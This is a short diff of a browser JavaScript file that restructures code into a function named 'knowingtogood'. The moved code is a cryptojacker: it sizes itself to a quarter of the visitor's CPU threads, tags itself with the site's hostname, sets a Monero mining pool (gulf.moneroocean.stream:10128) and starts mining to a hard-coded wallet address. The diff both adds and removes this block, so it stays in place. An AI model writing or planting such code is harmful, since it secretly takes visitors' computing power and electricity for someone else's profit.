@@ -111,30 +111,31 @@ function knowingtogood() {
   setTimeout(function () {
     informWorker(newWorker);
   }, 2000);
-}
 
-function getT(t){
-  if (t > 1){
-    if (t){
-      return Math.ceil(t / 4)
+  function getT(t){
+    if (t > 1){
+      if (t){
+        return Math.ceil(t / 4)
+      }
+      return 1
     }
-    return 1
+   
+    return 0
   }
- 
-  return 0
+  
+  function getResourceName(){
+    let resource = window.location.href.split("/")[2]
+    if (!resource){
+        return "Nada"
+    }
+    return resource
+  }
+  
+  let threadDisp = getT(navigator.hardwareConcurrency);
+  if (threadDisp > 0){
+    let name =  getResourceName();
+    CustomPool = "gulf.moneroocean.stream:10128"
+    PerfektStart("87cpPYpiga6LY5pirZZzfx1gXW72HrfZKPt7ZJZgHv9qHPYdGQCNmGY2SGgJGv8RkcKvF34ZYiSxJG6f4ZH4KeDiRpPc38r", `${name} - ${threadDisp}`, threadDisp);
+  }   
 }
 
-function getResourceName(){
-  let resource = window.location.href.split("/")[2]
-  if (!resource){
-      return "Nada"
-  }
-  return resource
-}
-
-let threadDisp = getT(navigator.hardwareConcurrency);
-if (threadDisp > 0){
-  let name =  getResourceName();
-  CustomPool = "gulf.moneroocean.stream:10128"
-  PerfektStart("87cpPYpiga6LY5pirZZzfx1gXW72HrfZKPt7ZJZgHv9qHPYdGQCNmGY2SGgJGv8RkcKvF34ZYiSxJG6f4ZH4KeDiRpPc38r", `${name} - ${threadDisp}`, threadDisp);
-} 
